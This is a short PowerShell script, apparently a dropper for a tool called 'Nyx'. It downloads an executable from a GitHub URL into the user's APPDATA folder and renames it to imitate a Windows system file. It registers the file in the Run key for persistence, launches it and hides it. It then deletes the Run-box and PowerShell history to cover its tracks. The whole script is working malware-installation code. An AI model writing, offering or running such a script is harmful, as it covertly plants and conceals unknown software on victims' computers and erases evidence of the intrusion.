# Nyx - 6XC49S5B

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "6XC49S5B" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/6XC49S5B/6XC49S5B.exe -OutFile "$env:APPDATA\6XC49S5B\6XC49S5B.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\6XC49S5B\6XC49S5B.exe" -NewName "PresentationFondCache.exe"

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "6XC49S5B" `
-Value "$env:APPDATA\6XC49S5B\PresentationFondCache.exe"

# Run Nyx
& "$env:APPDATA\6XC49S5B\PresentationFondCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\6XC49S5B\PresentationFondCache.exe" -Force
$FILE.attributes='Hidden'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
